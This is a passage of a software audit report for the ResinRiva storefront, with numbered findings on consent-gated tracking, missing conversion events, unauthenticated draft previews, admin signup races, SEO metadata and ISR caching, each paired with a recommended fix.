- Impact: The intended one-env-var enablement instantly sends PageView plus Contact conversions (whatsapp-tracker.tsx:35) for every visitor with no opt-out, exposing the store to India DPDP Act / GDPR risk and eroding trust the instant paid marketing starts.
- Recommendation: Add a small consent gate: a client ConsentBanner (LiquidGlass surface, porcelain/70 body text, primary sapphire Button, rendered only when a pixel/GA env var is set) that stores the choice in localStorage; mount MarketingScripts only after opt-in, or load gtag with Consent Mode v2 defaults denied and call fbq('consent','revoke') until granted, and have WhatsAppTracker's fbqTrack check the stored consent flag. Extensibility: the gate is one additive component behind the existing MarketingScripts mount point in src/app/(public)/layout.tsx:123, so future tags (e.g. Pinterest) inherit the same consent check without touching any page.
- Preserve Brand: Banner reuses existing LiquidGlass, porcelain text and sapphire Button tokens on the .dark canvas — no new hues, no theme flips.
- Extensibility: The consent gate is a single additive component wrapping the existing MarketingScripts mount point, so future marketing tags inherit it without modifying any existing page or component.
- Status: Verified

**[MKT-206] Deepest-funnel conversions (order_submitted, custom_order_submitted, newsletter, contact) never reach Meta or GA4 — ad platforms can only see top-funnel Contact clicks**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/components/analytics/whatsapp-tracker.tsx:35; src/components/analytics/marketing-scripts.tsx:41; src/components/product/order-panel.tsx:269-270; src/components/sections/custom-order-form.tsx:225; src/components/sections/newsletter-form.tsx:50; src/components/sections/contact-form.tsx:99
- Observation: The only fbq event in the codebase is 'Contact' fired on wa.me anchor clicks (whatsapp-tracker.tsx:35) and the only gtag call is the config bootstrap (marketing-scripts.tsx:41); the true conversions — order_submitted, whatsapp_redirected, custom_order_submitted, newsletter_subscribe, contact_submitted — go exclusively to Vercel Analytics track(), and the post-submit window.open handoff (order-panel.tsx:273) is programmatic so the click-listener Contact never fires for completed orders either.
- Impact: Even with the pixel enabled, Meta/GA4 can never optimize toward or attribute actual submitted inquiries (a submitted order paradoxically produces NO pixel event at all), capping paid-acquisition efficiency exactly as MKT-002 warned — this is a new gap in the shipped forwarding layer, not the already-recorded absence of a pixel.
- Recommendation: Extract whatsapp-tracker's fbqTrack into a shared src/lib/analytics.ts helper that wraps track() and mirrors key events — fbq('track','Lead') + gtag('event','generate_lead') on order_submitted/custom_order_submitted/newsletter_subscribe, fbq SubmitApplication or Contact on whatsapp_redirected — then call it from the four existing call sites; keep fire-and-forget try/catch semantics.
- Status: Verified

**[MKT-207] Product and custom-order inquiries trigger no owner notification — a blocked WhatsApp popup silently kills the highest-intent leads**
- Scope: Shared
- Severity: Major
- Effort: S
- Location: src/actions/order.ts:146-172; src/actions/order.ts:240-262; src/actions/public.ts:88-95; src/lib/email.ts:21
- Observation: submitContactInquiry fires sendContactNotification (public.ts:90) but submitProductOrder and submitCustomOrder create the Inquiry row and return the wa.me URL with no notification of any kind — order.ts imports nothing from lib/email.ts, and email.ts contains only contact and password-reset senders; the funnel then depends entirely on the customer themselves tapping send in WhatsApp (order-panel.tsx:273-274 opens the popup, /whatsapp-order is the fallback).
- Impact: When the popup is blocked or the customer abandons on /whatsapp-order without tapping 'Open WhatsApp', a fully-detailed lead with a captured phone number sits unseen in /studio/inquiries until staff happen to log in — for a WhatsApp-only business, response latency on these leads is the single biggest conversion lever and it is currently unbounded.
- Recommendation: Add a sendOrderNotification helper to src/lib/email.ts (clone of sendContactNotification, reusing studioFrom() and never-throw semantics) and fire it void-style from both order actions with the inquiry id, source and whatsappMessage; optionally include a direct wa.me link to the customer's phone so the owner can proactively pick up stalled orders. Extensibility: the helper slots beside the existing contact notifier and both actions call it identically, so a future channel (e.g. a staff WhatsApp/webhook ping) replaces one function body without touching the funnel.
- Preserve Brand: Email-only backend change; any HTML template reuses the existing sapphire #0f52ba / gold #d4af37 email styling already in sendPasswordResetEmail.
- Extensibility: A single never-throw notifier function called from both order actions means future notification channels swap in behind one interface without touching the conversion path.
- Status: Verified

**[MKT-208] Newsletter Subscriber capture is write-only — no studio list, export, or send path exists, so the promised 'first access' emails can never be sent**
- Scope: Studio
- Severity: Major
- Effort: M
- Location: prisma/schema.prisma:420-429; src/actions/public.ts:148-152; src/components/studio/sidebar.tsx:31-71; src/components/sections/newsletter-form.tsx:66
- Observation: db.subscriber is referenced exactly once in the entire codebase (the upsert in public.ts:148); the studio sidebar has no Subscribers entry, the dashboard never queries the table, there is no CSV export route and no ESP/webhook — yet the success copy promises 'we'll email you first access to new drops' (newsletter-form.tsx:66).
- Impact: The MKT-003 remediation collects real emails into a table the owner cannot see or use without raw SQL access, so the owned re-engagement channel produces zero re-engagement and the on-site promise is structurally unkeepable.
- Recommendation: Add a /studio/subscribers page (reuse the existing studio table primitives: StudioTableHead, Pagination, PageHeader) listing email/source/createdAt with a requireStaff-gated CSV export server action, plus a subscriber count card on the studio dashboard; a Resend-audience sync can follow later as Optional. Extensibility: the page follows the same list-page pattern as /studio/inquiries, so filters, bulk delete or ESP sync bolt on without schema changes.
- Preserve Brand: Studio addition stays on the light :root admin theme using existing studio table components — public Midnight Sapphire palette untouched.
- Extensibility: Built on the existing studio list-page pattern (table primitives + server actions), so export formats and ESP sync can be added behind the same page without new architecture.
- Status: Verified

**[MKT-209] Product share-composer clicks fire whatsapp_cta_click and a Meta 'Contact' conversion — shares pollute the core conversion metric with false positives**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/components/analytics/whatsapp-tracker.tsx:25-27; src/components/product/share-buttons.tsx:33-35,51-62
- Observation: ShareButtons builds a numberless share-composer link https://wa.me/?text=… (share-buttons.tsx:33) which matches WhatsAppTracker's delegated selector a[href*="wa.me"] (whatsapp-tracker.tsx:25-27), so one share click emits share_product AND whatsapp_cta_click AND fbq('track','Contact') — although the user is sharing the page with a friend, not contacting the business; this is a defect in the newly-shipped tracker, not the previously-recorded absence of tracking (MKT-001).
- Impact: The primary KPI (whatsapp_cta_click) and the Meta Contact conversion are inflated by non-contact share actions, feeding ad-platform optimization and CRO decisions with false signal.
- Recommendation: In WhatsAppTracker.onClick, skip anchors whose wa.me URL has no phone number path segment (new URL(anchor.href).pathname === '/' means share composer), or mark the share anchor with data-wa-share and early-return on it — keeping share_product as that surface's only event.
- Status: Verified

**[MKT-210] /custom-order — the highest-anxiety decision point — renders zero social proof even when testimonials and portfolio pieces exist in the database**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/custom-order/page.tsx:37-153; src/app/(public)/page.tsx:700-713
- Observation: The custom-order route contains only the hero, the form and the 3-step explainer — no testimonial quote, portfolio strip, commission count or rating appears anywhere on it, while TestimonialCarousel and the Review JSON-LD render exclusively on the homepage (page.tsx:700-713); prior findings covered homepage seeding (MKT-004) and product-page trust bullets (MKT-008), not the commission route's absence of third-party proof.
- Impact: Visitors asked to describe a bespoke, pay-later commission see no evidence anyone has successfully commissioned before, adding avoidable hesitation at the funnel's single most demanding step.
- Recommendation: Render one or two existing testimonials (reuse TestimonialCarousel or a static quote card in LiquidGlass with the gold star row) beneath the sticky 'how commissions work' rail, plus a 'See recent commissions' link to /portfolio — server-fetched with the same db.testimonial query the homepage uses, hidden when empty. Extensibility: the block is a self-contained server component fed by the existing testimonial query, so contact and workshop pages can mount it later unchanged.
- Preserve Brand: Reuses the existing LiquidGlass surface, gold star accents and porcelain/foreground text tokens already used by TestimonialCarousel on the dark canvas.
- Extensibility: A self-contained testimonial block driven by the existing query can be mounted on any route (contact, workshops) without duplication.
- Status: Verified

#### Engineering (ENG)

**[ENG-802] Draft 'staff preview' is an unauthenticated ?preview=1 query param — anyone can view DRAFT products, portfolios and blog posts (including unrewritten scraped competitor content)**
- Scope: Public
- Severity: Major
- Effort: S
- Location: src/app/(public)/product/[slug]/page.tsx:120-128; src/app/(public)/portfolio/[slug]/page.tsx:142-148; src/app/(public)/blog/[slug]/page.tsx:172-178; src/actions/scraper-review.ts:294
- Observation: All three detail pages gate drafts with only `const preview = previewParam === "1"` from searchParams and no auth() / session check, despite the comment 'Drafts are visible only with the staff preview link' (product/[slug]/page.tsx:127, blog/[slug]/page.tsx:177), and scraper imports mint product slugs directly from the competitor's own slug (`row.slug || slugify(row.title)`, scraper-review.ts:294) while storing needsRewrite=true scraped copy.
- Impact: Anyone who appends ?preview=1 to a guessable slug — trivially the competitor's own product slug for scraper-imported drafts — can read unpublished content, including verbatim scraped reference copy the publish-guard (products.ts:107-113) exists to keep off the public site.
- Recommendation: Gate preview on the existing staff session: these routes are already dynamic, so `const staff = Boolean((await auth())?.user)` (src/lib/auth.ts) before honouring preview, or switch to Next draftMode() enabled by a requireStaff server action; no new dependencies, no visual change to the Midnight Sapphire pages.
- Status: Verified
- _Cross-lens: the SEO lens flagged the same `?preview=1` gap for indexation — a draft served via preview ships a self-canonical to a URL that 404s while unpublished and no `robots: noindex`. The recommendation below folds in the SEO fix (return `robots:{index:false}` in `generateMetadata` when `status !== "PUBLISHED"`)._

**[ENG-803] The entire /studio tree has no error.tsx, loading.tsx or not-found.tsx — any server error replaces the admin with the bare global-error document**
- Scope: Studio
- Severity: Major
- Effort: S
- Location: src/app/studio/(dashboard)/layout.tsx:14 (no sibling boundaries; `find src/app -name error.tsx -o -name loading.tsx -o -name not-found.tsx` returns only (public)/* and root files); src/app/global-error.tsx:73-101
- Observation: The (public) group ships error.tsx/loading.tsx/not-found.tsx but no boundary file exists anywhere under src/app/studio, so an exception in any of the ~27 studio pages (e.g. a transient Neon failure in the unpaginated inquiries query) bubbles past the studio layout to global-error.tsx, which replaces the whole document with the public-branded inline-styled crash page and loses the sidebar/nav; slow first loads render nothing while queries run.
- Impact: One flaky query turns the whole admin into a dead-end consumer error screen with no studio navigation or retry-in-place, and staff get zero loading feedback on data-heavy screens.
- Recommendation: Add a studio/(dashboard)/error.tsx (client component using the existing light :root studio tokens and Button) that keeps the shell usable with a reset() retry, plus a lightweight loading.tsx skeleton reusing the existing bg-card/shadow-luxe-sm card styles; optionally a studio not-found.tsx so 404s stay inside the admin chrome.
- Status: Verified
- _Cross-lens: also reported by the UI/UX lens (transient error strands staff on the customer-voice dark crash page with no route back to /studio); consolidated here._

**[ENG-804] Contact-lead notification email is fired un-awaited inside a serverless action — Vercel may freeze the function before the Resend call completes**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/actions/public.ts:90-95; src/lib/email.ts:21-65
- Observation: submitContactInquiry returns `{ ok: true }` immediately after `void sendContactNotification(...)` (public.ts:90), leaving the Resend fetch as a dangling promise; on Vercel, work scheduled after the response resolves is not guaranteed to run (that is what waitUntil/after exist for), so the notification can be dropped whenever the instance suspends — silently, since sendContactNotification already swallows all errors (email.ts:56-64).
- Impact: The owner's only push signal for new contact leads intermittently never sends in production even though the ENG-003 sender fix landed; the lead sits unnoticed in the studio inbox.
- Recommendation: Either simply `await sendContactNotification(...)` (it never throws by design, cost is one HTTP round-trip before responding) or wrap it in Next 16's `after()` from next/server so it runs in the guaranteed post-response window — existing stack only. Distinct from recorded ENG-003, which was the hardcoded sandbox sender (now fixed at email.ts:50); this is a different failure mechanism in the caller.
- Status: Verified

**[ENG-805] Studio WhatsApp-orders inbox fetches every inquiry ever, unpaginated and unscoped — including the full whatsappMessage TEXT and Json columns per row**
- Scope: Studio
- Severity: Major
- Effort: M
- Location: src/app/studio/(dashboard)/inquiries/page.tsx:48-57,63-71; src/app/studio/(dashboard)/products/page.tsx:36-45; contrast src/app/studio/(dashboard)/activity/page.tsx:15,60-67 and src/app/studio/(dashboard)/media/page.tsx:17,40-44
- Observation: db.inquiry.findMany has no take and no select, hydrating whatsappMessage (@db.Text, up to ~1500 chars), selections, referenceImageUrls and notes for every row on each visit and each ?q= filter render, then serialises the whole mapped list into the InquiryList client component; the codebase already knows better — activity is paginated at 50 and media capped at 200 — and products/page.tsx:37 shares the no-take pattern (though that table is owner-bounded).
- Impact: Inquiries grow with public traffic (every order/contact/spam attempt inserts a row, and the in-memory rate limiter is per-instance), so the primary ops screen degrades linearly toward multi-MB queries and slow renders with no ceiling.
- Recommendation: Add `take` + cursor or the activity page's PAGE_SIZE pattern, and a `select` matching the InquiryRow shape (id, customerName, phone, source, status, createdAt, product.title) — the existing [status, createdAt] index (prisma/schema.prisma:157) already supports this ordering. Distinct from the recorded product-form/DataTable monolith item: this is server query scoping, not component refactoring.
- Status: Verified

**[ENG-806] deleteProducts media cleanup can delete files still used by other products, and does N sequential unindexed Media.url scans**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/actions/products.ts:277-299; prisma/schema.prisma:252-265; src/actions/import.ts:372-373
- Observation: For every image URL of the deleted products the action runs `db.media.findFirst({ where: { url } })` (Media.url has no index — only pathname @unique and folder are indexed) then deletes the blob and the Media row, but nothing checks whether another Product/Portfolio/BlogPost/Category still references that URL; URL sharing is realistic because bulk import passes existing Blob/uploads URLs through untouched (`url.includes(".blob.vercel-storage.com") return url`, import.ts:373), so two products created from the same sheet rows point at one file.
- Impact: Deleting one of two products that share a gallery URL silently 404s the surviving product's images on the live site, and a 50-product batch delete issues hundreds of sequential full-table scans plus blob round-trips inside one action.
- Recommendation: Before deleting the file, count remaining ProductImage/PortfolioImage/coverImage references to the URL and skip when shared; add `@@index([url])` to Media (or resolve via the unique pathname derived from the URL), and batch the lookups with one `findMany({ where: { url: { in: urls } } })`.
- Status: Verified

**[ENG-807] Public /search runs three unbounded-length ILIKE queries — the q param has no max length, unlike the shop action's own 120-char cap**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/search/page.tsx:133-143,43-91; contrast src/actions/shop.ts:18
- Observation: SearchPage takes `raw?.trim() ?? ""` with only a MIN_QUERY=2 lower bound and feeds it verbatim into contains filters over Product.title/shortTagline/description, BlogPost and Portfolio (description/story are @db.Text) on a force-dynamic, unauthenticated, un-rate-limited route, while the sibling loadMoreProducts action zod-caps q at 120 chars — server-side validation symmetry the codebase itself established.
- Impact: A crawler or abuser can hammer /search?q=<multi-KB string> forcing repeated sequential-scan ILIKE work on Neon with zero caching, and legitimate long pastes behave differently from the shop's capped search.
- Recommendation: Mirror the shop action: `query = raw.trim().slice(0, 120)` (or a zod safeParse) before querying, matching src/actions/shop.ts:18. Distinct from recorded SEO-001 (indexability, fixed) and UIUX-P31 (input UX) — this is server input validation.
- Status: Verified

**[ENG-808] First-admin bootstrap is a check-then-create race — concurrent signups can both pass the zero-users gate**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/actions/auth-public.ts:56-79
- Observation: signUpFirstAdmin gates on `(await db.user.count()) > 0` then creates an ADMIN in a separate statement with a bcrypt hash computed in between (~100-300ms window); two overlapping requests with different emails both observe count 0 and both insert Role.ADMIN rows — nothing in the schema or a transaction enforces the one-time invariant.
- Impact: During the deploy-to-first-signup window an attacker racing the owner's submission can plant a second, unnoticed ADMIN account instead of being turned away with ?closed=1.
- Recommendation: Wrap the count check and create in one `db.$transaction(async tx => { if (await tx.user.count() > 0) throw ...; return tx.user.create(...) })` (serializable or a re-check after create with rollback), and surface the closed redirect from the transaction failure — pure Prisma, no new infra.
- Status: Verified

**[ENG-809] uniqueSlug is check-then-create across all content types — concurrent creates collide into a P2002 that surfaces as a generic failure**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/lib/slug.ts:17-27; src/actions/products.ts:142-156; src/actions/blog.ts:116-126; src/actions/categories.ts:54-70; src/actions/scraper-review.ts:294-317
- Observation: uniqueSlug probes existence with sequential findUnique calls and the eventual create runs outside any lock, so two concurrent creations of same-titled items (e.g. a bulk import batch racing a manual save, or two addScrapedToCatalog rows with identical competitor slugs processed across instances) mint the same candidate and the loser throws P2002, which runAction masks as 'Something went wrong. Please try again.' (helpers.ts:29-34).
- Impact: The colliding save fails opaquely and, in scraper/import loops, the row lands in the errors list with no hint that a simple retry would succeed.
- Recommendation: Catch Prisma error code P2002 at the create sites and retry once with the next `-${i}` suffix (or append a short random suffix), keeping uniqueSlug as the fast path — small shared helper next to uniqueSlug in src/lib/slug.ts.
- Status: Verified

**[ENG-810] Three server-side helpers are copy-pasted 6-9 times each instead of living in shared modules (isRenderableSrc x9, clientIp x6, nullIfEmpty x6)**
- Scope: Shared
- Severity: Minor
- Effort: S
- Location: src/app/(public)/page.tsx:58; src/app/(public)/product/[slug]/page.tsx:49; src/app/(public)/portfolio/[slug]/page.tsx:37; src/app/(public)/blog/[slug]/page.tsx:53; src/app/(public)/blog/page.tsx:55; src/app/(public)/workshops/page.tsx:41; src/components/shop/product-card.tsx:12; src/components/shop/quick-view.tsx:27; src/components/portfolio/portfolio-card.tsx:9; src/actions/order.ts:62-66; src/actions/public.ts:48-50,136-138; src/actions/auth-public.ts:112-113; src/lib/auth.ts:18-24; src/app/api/upload/route.ts:29-30; src/actions/{blog,products,pages,import,settings,portfolio}.ts (nullIfEmpty)
- Observation: The identical `isRenderableSrc` guard is redeclared in 9 files (a natural companion to the existing src/lib/image-src.ts), the x-forwarded-for IP extraction is redeclared 6 times with already-diverging shapes (auth.ts wraps try/catch, the upload route reads the header synchronously), and `nullIfEmpty` is redeclared in 6 action files.
- Impact: Behaviour drift is already starting (IP fallback differences) and any fix — e.g. trusting a different header, tightening renderable-URL rules — must be applied in up to nine places or the funnel behaves inconsistently.
- Recommendation: Hoist isRenderableSrc into src/lib/image-src.ts beside isOptimizableImageSrc, add a `clientIp()` helper in src/lib/rate-limit.ts (its only consumers are its callers), and export nullIfEmpty from a small src/actions/utils or src/lib/utils.ts; mechanical replace. Distinct from recorded DS-008 (studio table-header class string) and the wa.me payload area — different helpers entirely.
- Status: Verified

**[ENG-811] /whatsapp-order re-serves full customer PII (name, phone, email, brief) to any holder of the inquiry id for 24 hours, unauthenticated**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/whatsapp-order/page.tsx:36-47,71-75
- Observation: The popup-blocked fallback page does `db.inquiry.findFirst({ where: { id: idParam, createdAt: { gte: recentCutoff() } }, select: { whatsappMessage: true } })` with no session or secondary secret and prints the whole message — which buildOrderMessage packs with customer name, phone, optional email and reference-image URLs (src/lib/whatsapp.ts:57-62) — for any request carrying the cuid.
- Impact: The recovery link is a bearer capability URL, so anyone it leaks to (forwarded chat, shared/synced browser history, shoulder-surfed screen) can read the customer's contact details for a day; Prisma cuid() v1 ids are also timestamp-ordered rather than high-entropy tokens.
- Recommendation: Keep the flow but bind it to the creator: return a random one-time token alongside inquiryId from submitProductOrder/submitCustomOrder (store its SHA-256 on the Inquiry, mirroring the existing src/lib/tokens.ts pattern) and require it on this page, or store the pending message in sessionStorage client-side and drop the DB readback entirely. Distinct from recorded SEC-010 (reference-URL host validation, since fixed in order.ts:36-50) — this is the unauthenticated inquiry readback surface.
- Status: Verified

#### SEO/AEO (SEO)

**[SEO-502] Shop and category listings have zero crawlable pagination — products beyond the first 12 are invisible to crawlers from every listing page**
- Scope: Public
- Severity: Major
- Effort: M
- Location: src/components/shop/shop-explorer.tsx:136-167,310-321; src/actions/shop.ts:30-44; src/lib/shop.ts:151-156; src/app/(public)/shop/[category]/page.tsx:114-123
- Observation: /shop and /shop/[category] SSR only the first 12 products (fetchProductsPage take=12) and all further items load via an IntersectionObserver sentinel + `loadMoreProducts` server-action POST behind a <Button> — there is no <a href> pagination anywhere, and even the category CollectionPage ItemList emits only page.items (numberOfItems = first 12).
- Impact: Googlebot does not click buttons or invoke server actions, so every product past the newest 12 per listing has no internal-link path from any listing page and depends entirely on sitemap.xml plus 4-item related rails for discovery, starving the deeper catalog of link equity and rankings.
- Recommendation: Keep the infinite-scroll UX but add a crawlable fallback: support ?page=N on /shop and /shop/[category] (offset variant of fetchProductsPage) and render the 'Load more pieces' control as a real <Link href={`?page=${n+1}`}> that client-side intercepts into loadMoreProducts, plus extend the CollectionPage ItemList to all published slugs in the category; self-canonicalise each ?page=N like the /blog fix in the sibling finding. Extensibility: the ?page param slots into the existing ShopFilters parsing in src/lib/shop-filters.ts and the existing first() helpers, so future filters and the locked-category variant need no new routes or components.
- Preserve Brand: The fallback pagination link reuses the exact blog-pagination pill recipe (border-foreground/15, hover:border-sapphire hover:text-sapphire, porcelain text on sapphire when active) — no new hues, no arbitrary hex.
- Extensibility: Extensibility: the ?page param slots into the existing ShopFilters vocabulary in src/lib/shop-filters.ts shared by /shop, /shop/[category] and loadMoreProducts, so future filters need no new routes.
- Status: Verified

**[SEO-503] /blog pagination canonicalises every ?page=N onto /blog with identical titles, marking page 2+ as duplicates of page 1**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/blog/page.tsx:18-23,97,425-470
- Observation: The blog listing exports static metadata with `alternates:{canonical:"/blog"}` and a fixed title "Blog", yet renders real crawlable Previous/Next links to /blog?page=N (blogHref sets the page param), so /blog?page=2..N all emit <link rel=canonical href=…/blog> and identical <title>s — the exact anti-pattern Google's pagination guidance warns against (each paginated page must self-canonicalise).
- Impact: Google treats page 2+ as duplicates of page 1 and may never crawl the post links they contain, so once the journal exceeds PAGE_SIZE=12 posts, older posts lose their only listing-page discovery path and survive on sitemap entries alone.
- Recommendation: Convert to generateMetadata({searchParams}): canonical `/blog` for page 1 and `/blog?page=${page}` for deeper pages, appending " — Page N" to the title (filter-only variants ?category=/?tag= can keep canonical /blog for consolidation, matching the /shop pattern).
- Status: Verified

**[SEO-504] Homepage <title> double-brands via the root template and overflows the SERP limit**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/page.tsx:42-43; src/app/layout.tsx:22-25
- Observation: The home page sets a plain-string title "ResinRiva — Luxury custom resin art & 3D printing, made to order" while the root layout defines title.template "%s · ResinRiva", so the rendered tag is "ResinRiva — Luxury custom resin art & 3D printing, made to order · ResinRiva" (~79 chars, brand twice) — only string titles bypass the template via {absolute}, which this page does not use.
- Impact: The single most-weighted on-page element of the primary ranking page reads as duplicated branding and gets truncated at ~60 chars in Google, cutting off "made to order" and looking machine-generated in the brand SERP.
- Recommendation: Change the home metadata to `title: { absolute: "ResinRiva — Luxury Custom Resin Art & 3D Printing" }` (≤60 chars, single brand mention), letting the root template continue to suffix inner pages only.
- Status: Verified

**[SEO-505] Homepage Review/AggregateRating markup is self-serving (LocalBusiness reviewing itself) and categorically ineligible for star rich results**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/page.tsx:244-277,702
- Observation: The MKT-006 remediation attaches aggregateRating + review nodes to the site's own LocalBusiness entity (@id …/#localbusiness) on the brand's own homepage — Google's review-snippet policy explicitly excludes self-serving reviews, stating star snippets are never shown for LocalBusiness/Organization markup placed on the entity's own site; this is a NEW defect in the shipped implementation, not MKT-006 itself, which flagged the absence of any review markup.
- Impact: The markup can never produce the CTR-lifting stars it was built for, and self-serving review structured data is a documented trigger for a structured-data manual action that could suppress the site's other (valid) rich results.
- Recommendation: Move the Review/AggregateRating emission to Product JSON-LD on product pages where a testimonial maps to a piece (Product reviews are eligible), or drop the JSON-LD and keep the visual carousel; if kept anywhere, never on the LocalBusiness/Organization nodes.
- Status: Verified

**[SEO-506] No WebSite JSON-LD node — site-name display and Sitelinks-searchbox eligibility forfeited despite a live /search endpoint**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/layout.tsx:17-53; src/app/(public)/search/page.tsx:179-182
- Observation: The sitewide @graph contains only Organization and LocalBusiness — no WebSite node with name/url (Google's documented signal for the SERP 'site name') and no potentialAction SearchAction, even though a functioning GET /search?q={query} endpoint exists; this is distinct from SEO-007, which concerned thin data on the existing Organization/LocalBusiness nodes (sameAs/address/hours), not a missing schema type.
- Impact: Google must infer the site name for store.bhavyagondaliya.co.in SERP results (risking 'bhavyagondaliya.co.in' instead of 'ResinRiva') and the site is ineligible for the sitelinks search box.
- Recommendation: Add a third @graph node in BUSINESS_JSONLD: {"@type":"WebSite","@id":`${SITE.url}/#website`,name:SITE.name,url:SITE.url,publisher:{"@id":`${SITE.url}/#organization`},potentialAction:{"@type":"SearchAction",target:{"@type":"EntryPoint",urlTemplate:`${SITE.url}/search?q={search_term_string}`},"query-input":"required name=search_term_string"}}.
- Status: Verified

**[SEO-507] robots.txt disallow on /whatsapp-order hides its own noindex from crawlers, and /studio has no X-Robots-Tag fallback**
- Scope: Shared
- Severity: Minor
- Effort: S
- Location: src/app/robots.ts:9; src/app/(public)/whatsapp-order/page.tsx:20-23; next.config.ts:62-72
- Observation: robots.ts disallows /whatsapp-order while the page also sets robots:{index:false,follow:false} — a documented conflict: a robots.txt-blocked URL is never fetched, so its noindex meta is never seen and the URL can still be indexed reference-only from external links (users share /whatsapp-order?i=<id> links out of WhatsApp); /studio is likewise disallowed with no noindex meta or X-Robots-Tag header anywhere (next.config.ts:67-70 only adds X-Frame-Options for /studio).
- Impact: Shared order-landing URLs and /studio/login can surface in Google as bare URL-only results, exposing the private order-flow path in the brand's SERP footprint.
- Recommendation: Remove "/whatsapp-order" from the disallow array (its noindex meta then does the job), and add `{ key: "X-Robots-Tag", value: "noindex, nofollow" }` to the existing /studio/:path* headers block in next.config.ts; this is a different mechanism from SEO-001, which was about /search lacking any noindex at all.
- Status: Verified

**[SEO-508] /privacy and /terms are the only indexable routes without canonical tags**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/privacy/page.tsx:22-28; src/app/(public)/terms/page.tsx:22-28
- Observation: Both legal pages' generateMetadata return only title/description — no alternates.canonical — while every other public route sets one (about:21, contact:27, faq:26, shop:25, blog:22, etc.); both URLs are submitted in sitemap.ts:22-23, and this is a different file/mechanism from SEO-002, which was the (now-fixed) filter-param duplication on /shop/[category].
- Impact: Any parameterised hit on the legal pages (utm links, ?ref= shares) self-canonicalises as a duplicate URL with no consolidating signal, and the metadata pattern is inconsistent for future DB-driven pages cloned from these files.
- Recommendation: Add `alternates: { canonical: "/privacy" }` and `alternates: { canonical: "/terms" }` to the respective generateMetadata returns, matching every sibling static route.
- Status: Verified

**[SEO-509] Portfolio detail pages carry no content-level structured data — only BreadcrumbList**
- Scope: Public
- Severity: Minor
- Effort: S
- Location: src/app/(public)/portfolio/[slug]/page.tsx:211-235
- Observation: Unlike product pages (Product + AggregateOffer, product/[slug]/page.tsx:207-233) and blog posts (Article, blog/[slug]/page.tsx:190-203), the portfolio detail route emits only a BreadcrumbList even though it renders the site's richest answer-engine material — commission story, before/after images, material/size/timeline stats (resultsMeta) and video; no prior finding covers portfolio schema (SEO-003 was category CollectionPage, SEO-004 was Product brand/offers).
- Impact: Commission case studies — the pages most likely to be cited for long-tail queries like "preserve wedding bouquet in resin India" — give Google and answer engines no machine-readable entity to attribute, image-license, or surface in visual search.
- Recommendation: Emit a VisualArtwork (or CreativeWork) JsonLd node per portfolio: name, description (story excerpt), creator {"@id": `${SITE.url}/#organization`}, dateCreated, artMedium from resultsMeta.material, and image from afterImageUrl/gallery — reusing the existing JsonLd component and absoluteUrl helpers already imported on the page.
- Status: Verified

#### Performance (PERF)

**[PERF-304] Declared ISR is inert: awaiting searchParams forces per-request dynamic SSR on every catalog route**
- Scope: Public
- Severity: Major
- Effort: M
- Location: src/app/(public)/product/[slug]/page.tsx:38; src/app/(public)/product/[slug]/page.tsx:119; src/app/(public)/blog/[slug]/page.tsx:25; src/app/(public)/blog/[slug]/page.tsx:171; src/app/(public)/portfolio/[slug]/page.tsx:26; src/app/(public)/portfolio/[slug]/page.tsx:141; src/app/(public)/shop/page.tsx:19; src/app/(public)/shop/page.tsx:48; src/app/(public)/shop/[category]/page.tsx:23; src/app/(public)/shop/[category]/page.tsx:75; src/app/(public)/blog/page.tsx:16; src/app/(public)/blog/page.tsx:245; src/app/(public)/portfolio/page.tsx:20; src/app/(public)/portfolio/page.tsx:52
- Observation: All seven catalog routes declare `export const revalidate = 300` with comments like 'ISR: catalog edits reach the page within 5 minutes' (product/[slug]/page.tsx:37-38), yet each one awaits the `searchParams` prop (a Next.js dynamic API — product/blog/portfolio detail pages read it only for the staff `?preview=1` flag at product:119-121, blog:171-173, portfolio:141-143), which opts the whole route into request-time dynamic rendering, making the declared revalidate window inert; no `generateStaticParams` exists anywhere (grep: zero matches) and next.config.ts has no PPR/cacheComponents, so nothing is ever served from the static/ISR cache — this is a render-mode defect the prior audit never recorded (its register-pass topic was missing-revalidate coverage, not revalidate being silently disabled by a dynamic API).
- Impact: Every view of the primary conversion template (/product/[slug]) and every shop/blog/portfolio page is a full serverless SSR with 4-5 Neon round trips (getProduct twice, settings, related, layout getSiteSettings) plus cold-start latency instead of a CDN-cached HTML hit, directly inflating TTFB/LCP for all catalog traffic.
- Recommendation: Remove the searchParams prop from the three detail templates and serve draft previews through a separate dynamic route or Next's draftMode() cookie (e.g. a staff-only /studio preview segment rendering the same server component), restoring real ISR at the existing revalidate=300; keep /shop and the listing pages dynamic only if the filter querystring is present is not separable, otherwise accept them as dynamic but correct the misleading ISR comments so future work doesn't assume caching exists.
- Status: Verified
- _Cross-lens: the Engineering lens raised the same defect for its DB-load angle (getProduct runs twice per request, 4–6 Neon round-trips per view); consolidated here._

**[PERF-305] Post-hydration element-type flip remounts and re-hides the entire SSR-painted page (template.tsx + ScrollReveal/MouseParallaxLayer)**
- Scope: Public
- Severity: Major
- Effort: M
- Location: src/app/(public)/template.tsx:20; src/app/(public)/template.tsx:23-29; src/hooks/use-prefers-reduced-motion.ts:22; src/components/motion/scroll-reveal.tsx:39-52; src/components/motion/mouse-parallax.tsx:132-143
